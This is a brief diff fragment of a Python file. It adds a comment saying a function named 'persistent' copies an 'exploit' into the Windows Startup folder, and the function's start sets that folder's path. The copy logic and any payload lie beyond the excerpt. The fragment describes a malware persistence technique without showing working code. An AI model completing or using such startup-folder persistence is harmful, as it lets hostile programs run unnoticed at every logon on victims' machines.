@@ -1,6 +1,7 @@
 import os
 import shutil
 
+#responsible for copying exploit to startup
 def persistent():
     try:
         filepath = r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ '
